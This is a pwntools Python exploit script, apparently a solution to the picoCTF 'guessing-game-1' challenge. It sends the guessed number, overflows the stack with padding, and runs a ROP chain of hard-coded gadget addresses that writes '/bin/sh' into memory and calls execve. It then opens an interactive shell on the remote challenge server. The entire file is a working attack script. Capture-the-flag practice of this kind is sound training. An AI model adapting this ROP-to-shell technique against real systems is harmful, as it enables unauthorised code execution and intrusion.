#!/usr/bin/env python3

"""
[*] '/Users/yotam/Desktop/picoctf/binary-exploitation/guessing-game-1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
"""

from pwn import *

exe = ELF("./vuln_patched")

context.terminal = ["tmux", "splitw", "-h", "-F", "#{paneid}", "-P"]
context.binary = exe

GDB_ARGS = \
"""b *win+75
c
"""

WRITEABLE_MEMORY = 0x00000000006b7000
### GADGETS ###
WRITE = 0x000000000047ff91 # mov qword ptr [rsi], rax
POP_RAX = 0x00000000004163f4
EXECVE_SYSCALL_NUMBER = 0x3B
POP_RDI = 0x0000000000400696
POP_RSI = 0x0000000000410ca3
POP_RDX = 0x000000000044a6b5
SYSCALL = 0x000000000040137c


ANSWER = b"84"

def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path], GDB_ARGS)
        # r = process([exe.path])
    else:
        r = remote("jupiter.challenges.picoctf.org", 42953)

    return r


def generate_offset():
    pattern = b"A"*0x60
    for c in range(ord("A"), ord("D")):
        pattern += chr(c).encode()*8
    return pattern


def main():
    r = conn()

    # good luck pwning :)
    r.sendline(ANSWER) # Answer the correct number

    rop_chain = [
        ### WRITE /bin/sh TO MEMORY ###
        POP_RAX,                      #
        b"/bin/sh".ljust(8, b"\x00"), # RSI <-- "/bin/sh"
        POP_RSI,
        WRITEABLE_MEMORY,
        WRITE,

        ### EXECUTE SYSCALL ###
        POP_RAX,                      #
        EXECVE_SYSCALL_NUMBER,        # RAX <-- EXECVE_SYSCALL_NUMBER
        POP_RDI,                      # 
        WRITEABLE_MEMORY,             # RDI <-- ptr-->"/bin/sh"
        POP_RSI,                      #
        0x0,                          # RSI <-- 0x0
        POP_RDX,                      #
        0x0,                          # RDX <-- 0x0
        SYSCALL,
    ]
    tmp = b""
    for link in rop_chain:
        if type(link) == int:
            tmp += p64(link)
        else:
            tmp += link
    rop_chain = tmp

    payload = generate_offset() + rop_chain
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
